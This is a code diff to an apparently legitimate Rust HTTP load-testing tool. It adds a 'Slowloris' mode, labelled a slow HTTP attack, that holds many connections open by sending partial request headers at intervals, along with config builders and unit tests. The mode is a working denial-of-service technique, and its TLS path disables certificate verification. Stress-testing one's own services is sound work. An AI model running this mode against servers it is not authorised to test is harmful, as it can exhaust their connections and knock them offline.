@@ -72,6 +72,8 @@ pub enum LoadMode {
   Realistic,
   /// Maximum concurrent connections pressure (find breaking point)
   Stress,
+  /// Slow HTTP attack — holds connections with partial requests
+  Slowloris,
 }
 
 impl FromStr for LoadMode {
@@ -83,8 +85,9 @@ impl FromStr for LoadMode {
       "connections" | "conn" | "tls" => Ok(Self::Connections),
       "realistic" | "real" | "mixed" => Ok(Self::Realistic),
       "stress" | "max" | "break" => Ok(Self::Stress),
+      "slowloris" | "slow" | "loris" => Ok(Self::Slowloris),
       other => Err(format!(
-        "Invalid mode '{}'. Valid modes: throughput, connections, realistic, stress",
+        "Invalid mode '{}'. Valid modes: throughput, connections, realistic, stress, slowloris",
         other
       )),
     }
@@ -98,6 +101,7 @@ impl LoadMode {
       Self::Connections => "connections",
       Self::Realistic => "realistic",
       Self::Stress => "stress",
+      Self::Slowloris => "slowloris",
     }
   }
 
@@ -107,6 +111,7 @@ impl LoadMode {
       Self::Connections => "New TCP+TLS per request",
       Self::Realistic => "Mixed user behavior simulation",
       Self::Stress => "Maximum connection pressure",
+      Self::Slowloris => "Slow HTTP attack — holds connections with partial requests",
     }
   }
 }
@@ -418,6 +423,10 @@ pub struct LoadConfig {
   pub use_shared_http2_pool: bool,
   /// Maximum HTTP/2 connections per origin
   pub http2_max_connections_per_origin: usize,
+  /// Interval between sending keep-alive header lines (Slowloris mode)
+  pub slowloris_interval: Duration,
+  /// Initial headers to send before starting the slow drip
+  pub slowloris_initial_headers: usize,
 }
 
 impl LoadConfig {
@@ -446,6 +455,9 @@ impl LoadConfig {
       // HTTP/2 shared pool defaults
       use_shared_http2_pool: true,
       http2_max_connections_per_origin: 6,
+      // Slowloris defaults
+      slowloris_interval: Duration::from_secs(10),
+      slowloris_initial_headers: 3,
     }
   }
 
@@ -477,6 +489,12 @@ impl LoadConfig {
         self.http2_max_connections_per_origin = 4;
       }
       LoadMode::Stress => {
+        self.use_connection_pool = false;
+        self.use_shared_http2_pool = false;
+        self.think_time = Duration::ZERO;
+        self.think_time_variance = 0.0;
+      }
+      LoadMode::Slowloris => {
         self.use_connection_pool = false;
         self.use_shared_http2_pool = false;
         self.think_time = Duration::ZERO;
@@ -588,6 +606,16 @@ impl LoadConfig {
     self.http2_max_connections_per_origin = max.max(1);
     self
   }
+
+  pub fn with_slowloris_interval(mut self, interval: Duration) -> Self {
+    self.slowloris_interval = interval;
+    self
+  }
+
+  pub fn with_slowloris_initial_headers(mut self, count: usize) -> Self {
+    self.slowloris_initial_headers = count.max(1);
+    self
+  }
 }
 
 /// Simple PRNG using xorshift64 - thread-local state for think time variance
@@ -636,13 +664,219 @@ fn calculate_think_time(base: Duration, variance: f64) -> Duration {
 fn should_reuse_connection(config: &LoadConfig, worker_id: usize) -> bool {
   match config.mode {
     LoadMode::Throughput => true,
-    LoadMode::Connections | LoadMode::Stress => false,
+    LoadMode::Connections | LoadMode::Stress | LoadMode::Slowloris => false,
     LoadMode::Realistic => {
       // Deterministic split based on worker_id
       let ratio = worker_id as f64 / config.concurrent_users.max(1) as f64;
       ratio >= config.new_user_ratio
     }
   }
+}
+
+/// Simple xorshift64 PRNG for slowloris header generation
+fn simple_random(seed: &mut u64) -> u64 {
+  *seed ^= *seed << 13;
+  *seed ^= *seed >> 7;
+  *seed ^= *seed << 17;
+  *seed
+}
+
+/// Slowloris worker: opens a TCP (or TLS) connection, sends partial HTTP
+/// headers, then drip-feeds extra headers at `slowloris_interval` to keep
+/// the connection alive without ever completing the request.
+fn run_slowloris_worker(
+  config: &LoadConfig,
+  stats: &Arc<AtomicStatsCollector>,
+  should_stop: &Arc<Mutex<bool>>,
+  worker_id: usize,
+) {
+  let parsed = match parse_target(&config.url) {
+    Ok(target) => target,
+    Err(err) => {
+      stats.add(RequestStats::error(Duration::ZERO, Duration::ZERO, err));
+      return;
+    }
+  };
+
+  let addr = format!("{}:{}", parsed.host, parsed.port);
+
+  // Seed PRNG from worker_id and current time for uniqueness
+  let mut rng_state = std::time::SystemTime::now()
+    .duration_since(std::time::UNIX_EPOCH)
+    .unwrap_or_default()
+    .as_nanos() as u64;
+  rng_state = rng_state
+    .wrapping_add(worker_id as u64)
+    .wrapping_mul(6364136223846793005);
+  // Ensure non-zero seed
+  if rng_state == 0 {
+    rng_state = 0xdeadbeef_cafebabe;
+  }
+
+  let max_duration = config
+    .duration
+    .unwrap_or_else(|| Duration::from_secs(86400));
+  let worker_start = Instant::now();
+
+  loop {
+    // Check stop conditions
+    if *should_stop.lock().unwrap() {
+      break;
+    }
+    if worker_start.elapsed() >= max_duration {
+      let mut stop = should_stop.lock().unwrap();
+      *stop = true;
+      break;
+    }
+
+    let conn_start = Instant::now();
+
+    // Open a connection (plain TCP or TLS via boring)
+    let mut stream: Box<dyn std::io::Write + Send> = if parsed.is_https {
+      #[cfg(not(target_os = "windows"))]
+      {
+        match establish_tls_stream(&addr, &parsed.host) {
+          Ok(s) => Box::new(s),
+          Err(err) => {
+            stats.add(RequestStats::error(
+              conn_start.elapsed(),
+              conn_start.elapsed(),
+              format!("TLS connect failed: {}", err),
+            ));
+            // Brief backoff before retry
+            thread::sleep(Duration::from_millis(500));
+            continue;
+          }
+        }
+      }
+      #[cfg(target_os = "windows")]
+      {
+        stats.add(RequestStats::error(
+          conn_start.elapsed(),
+          conn_start.elapsed(),
+          "Slowloris TLS not supported on Windows".to_string(),
+        ));
+        return;
+      }
+    } else {
+      match std::net::TcpStream::connect(&addr) {
+        Ok(tcp) => {
+          let _ = tcp.set_write_timeout(Some(Duration::from_secs(30)));
+          let _ = tcp.set_read_timeout(Some(Duration::from_secs(1)));
+          Box::new(tcp)
+        }
+        Err(err) => {
+          stats.add(RequestStats::error(
+            conn_start.elapsed(),
+            conn_start.elapsed(),
+            format!("TCP connect failed: {}", err),
+          ));
+          thread::sleep(Duration::from_millis(500));
+          continue;
+        }
+      }
+    };
+
+    // Send the initial incomplete HTTP request
+    let initial_request = format!(
+      "GET {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,*/*\r\n",
+      parsed.path, parsed.host,
+    );
+
+    if let Err(err) = stream.write_all(initial_request.as_bytes()) {
+      stats.add(RequestStats::error(
+        conn_start.elapsed(),
+        conn_start.elapsed(),
+        format!("Initial write failed: {}", err),
+      ));
+      continue;
+    }
+    let _ = stream.flush();
+
+    // Count the initial headers as successful "requests" (one stat per header sent)
+    // Initial line + Host + User-Agent + Accept = config.slowloris_initial_headers
+    for _ in 0..config.slowloris_initial_headers {
+      stats.add(RequestStats::success(
+        conn_start.elapsed(),
+        conn_start.elapsed(),
+        0, // no HTTP status yet
+        0,
+      ));
+    }
+
+    // Drip-feed extra headers at the configured interval
+    loop {
+      // Check stop before sleeping
+      if *should_stop.lock().unwrap() {
+        return;
+      }
+      if worker_start.elapsed() >= max_duration {
+        let mut stop = should_stop.lock().unwrap();
+        *stop = true;
+        return;
+      }
+
+      // Sleep for the slowloris interval, checking stop periodically
+      let sleep_end = Instant::now() + config.slowloris_interval;
+      while Instant::now() < sleep_end {
+        if *should_stop.lock().unwrap() {
+          return;
+        }
+        let remaining = sleep_end.saturating_duration_since(Instant::now());
+        thread::sleep(remaining.min(Duration::from_millis(500)));
+      }
+
+      // Generate a random keep-alive header
+      let key_val = simple_random(&mut rng_state);
+      let val_val = simple_random(&mut rng_state);
+      let header_line = format!("X-rb-{}: {}\r\n", key_val, val_val);
+
+      match stream.write_all(header_line.as_bytes()) {
+        Ok(()) => {
+          let _ = stream.flush();
+          // Each header sent counts as a successful "request" in stats
+          stats.add(RequestStats::success(
+            conn_start.elapsed(),
+            conn_start.elapsed(),
+            0,
+            header_line.len(),
+          ));
+        }
+        Err(_) => {
+          // Connection dropped — count as error and reconnect
+          stats.add(RequestStats::error(
+            conn_start.elapsed(),
+            conn_start.elapsed(),
+            "Connection dropped — reconnecting".to_string(),
+          ));
+          break; // Break inner loop to reconnect in outer loop
+        }
+      }
+    }
+  }
+}
+
+/// Establish a TLS connection using boring for Slowloris mode
+#[cfg(not(target_os = "windows"))]
+fn establish_tls_stream(
+  addr: &str,
+  host: &str,
+) -> Result<boring::ssl::SslStream<std::net::TcpStream>, String> {
+  use boring::ssl::{SslConnector, SslMethod, SslVerifyMode};
+
+  let tcp =
+    std::net::TcpStream::connect(addr).map_err(|e| format!("TCP connect to {}: {}", addr, e))?;
+  let _ = tcp.set_write_timeout(Some(Duration::from_secs(30)));
+  let _ = tcp.set_read_timeout(Some(Duration::from_secs(1)));
+
+  let mut builder =
+    SslConnector::builder(SslMethod::tls()).map_err(|e| format!("SSL connector builder: {}", e))?;
+  builder.set_verify(SslVerifyMode::NONE);
+  let connector = builder.build();
+
+  connector
+    .connect(host, tcp)
+    .map_err(|e| format!("TLS handshake with {}: {}", host, e))
 }
 
 fn run_worker_session(
@@ -654,6 +888,12 @@ fn run_worker_session(
   tracker: Arc<ProtocolTracker>,
   worker_id: usize,
 ) {
+  // Slowloris mode uses its own dedicated worker
+  if config.mode == LoadMode::Slowloris {
+    run_slowloris_worker(&config, &stats, &should_stop, worker_id);
+    return;
+  }
+
   let parsed = match parse_target(&config.url) {
     Ok(target) => target,
     Err(err) => {
@@ -1337,6 +1577,14 @@ mod tests {
     assert_eq!(LoadMode::from_str("max").unwrap(), LoadMode::Stress);
     assert_eq!(LoadMode::from_str("break").unwrap(), LoadMode::Stress);
 
+    // Slowloris variants
+    assert_eq!(
+      LoadMode::from_str("slowloris").unwrap(),
+      LoadMode::Slowloris
+    );
+    assert_eq!(LoadMode::from_str("slow").unwrap(), LoadMode::Slowloris);
+    assert_eq!(LoadMode::from_str("loris").unwrap(), LoadMode::Slowloris);
+
     // Invalid
     assert!(LoadMode::from_str("invalid").is_err());
   }
@@ -1440,6 +1688,14 @@ mod tests {
     assert_eq!(config.think_time, Duration::from_millis(200));
     assert_eq!(config.new_user_ratio, 0.3);
     assert_eq!(config.session_length, Some(10));
+
+    // Slowloris mode
+    let config = LoadConfig::new("https://test.com".to_string()).with_mode(LoadMode::Slowloris);
+    assert!(!config.use_connection_pool);
+    assert!(!config.use_shared_http2_pool);
+    assert_eq!(config.think_time, Duration::ZERO);
+    assert_eq!(config.slowloris_interval, Duration::from_secs(10));
+    assert_eq!(config.slowloris_initial_headers, 3);
   }
 
   #[test]
@@ -1460,6 +1716,11 @@ mod tests {
     config.mode = LoadMode::Stress;
     assert!(!should_reuse_connection(&config, 0));
 
+    // Slowloris never reuses
+    config.mode = LoadMode::Slowloris;
+    assert!(!should_reuse_connection(&config, 0));
+    assert!(!should_reuse_connection(&config, 99));
+
     // Realistic depends on worker_id and ratio
     config.mode = LoadMode::Realistic;
     config.concurrent_users = 10;
@@ -1470,5 +1731,42 @@ mod tests {
     // Workers 3-9 (70%) are "returning users" - reuse connections
     assert!(should_reuse_connection(&config, 3));
     assert!(should_reuse_connection(&config, 9));
+  }
+
+  #[test]
+  fn test_simple_random() {
+    let mut seed: u64 = 12345;
+    let a = simple_random(&mut seed);
+    let b = simple_random(&mut seed);
+    // Values should differ
+    assert_ne!(a, b);
+    // Seed should have changed
+    assert_ne!(seed, 12345);
+    // Deterministic: same seed produces same sequence
+    let mut seed2: u64 = 12345;
+    let a2 = simple_random(&mut seed2);
+    assert_eq!(a, a2);
+  }
+
+  #[test]
+  fn test_slowloris_config_builders() {
+    let config = LoadConfig::new("https://test.com".to_string())
+      .with_slowloris_interval(Duration::from_secs(5))
+      .with_slowloris_initial_headers(6);
+    assert_eq!(config.slowloris_interval, Duration::from_secs(5));
+    assert_eq!(config.slowloris_initial_headers, 6);
+
+    // Minimum initial headers is 1
+    let config = LoadConfig::new("https://test.com".to_string()).with_slowloris_initial_headers(0);
+    assert_eq!(config.slowloris_initial_headers, 1);
+  }
+
+  #[test]
+  fn test_slowloris_mode_labels() {
+    assert_eq!(LoadMode::Slowloris.label(), "slowloris");
+    assert_eq!(
+      LoadMode::Slowloris.description(),
+      "Slow HTTP attack \u{2014} holds connections with partial requests"
+    );
   }
 }
